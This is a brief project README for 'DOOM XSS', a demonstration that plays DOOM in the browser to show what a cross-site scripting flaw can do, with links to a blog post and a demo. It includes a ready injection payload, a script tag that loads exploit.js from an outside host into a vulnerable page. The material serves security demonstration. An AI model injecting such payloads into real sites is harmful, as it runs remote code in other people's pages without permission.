## DOOM XSS

This project allows you to play DOOM in the browser. Here is [a silly blog post](https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/) explaining how an XSS vulnerability could be used to achieve "DOOM execution" on Tesla.

### Demo

To demonstrate how this works, follow [this link to doom.pwn.life](https://doom.pwn.life/). The code is hosted here on GitHub pages.

### XSS

If you ever want to demonstrate the possibilities of a XSS vulnerability (as shown in the blog post), you may make an inclusion of [exploit.js](https://almroot.github.io/doom/exploit.js) like so: `<script src='https://almroot.github.io/doom/exploit.js'></script>`. Please note that I take no responsibilities for your actions, make sure you have permissions from the website owner(s) before doing anything bad.
